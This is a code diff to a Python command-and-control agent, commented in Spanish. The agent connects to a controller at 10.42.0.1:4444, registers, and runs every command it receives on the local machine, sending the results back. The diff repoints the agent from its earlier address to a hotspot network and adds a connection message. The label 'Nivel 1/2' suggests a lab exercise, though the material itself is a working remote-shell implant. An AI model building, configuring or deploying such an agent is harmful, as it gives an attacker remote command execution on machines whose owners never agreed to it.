@@ -1,9 +1,6 @@
 """
-Agente C2 - Nivel 1/2
-Se conecta al servidor, se registra, y queda escuchando comandos.
-Cada comando recibido se ejecuta localmente y el resultado se devuelve.
-
-Protocolo: JSON, un mensaje por línea (newline-delimited JSON).
+Agente C2 - Versión para RED (Hotspot)
+CONFIGURADO PARA: Conectarse al servidor via hotspot
 """
 
 import socket
@@ -13,7 +10,10 @@ import platform
 import uuid
 import time
 
-SERVER_HOST = "10.251.176.91"  # localhost para pruebas locales (cambiar a IP real para red)
+# ============================================
+# CONFIGURACIÓN PARA RED HOTSPOT
+# ============================================
+SERVER_HOST = "10.42.0.1"  # IP típica de hotspot en Linux
 SERVER_PORT = 4444
 AGENT_ID = "agent-" + str(uuid.uuid4())[:6]
 
@@ -56,6 +56,7 @@ def execute_command(command: str) -> str:
 
 
 def run_agent():
+    print(f"[*] Intentando conectar a {SERVER_HOST}:{SERVER_PORT}")
     while True:  # loop de reconexión
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
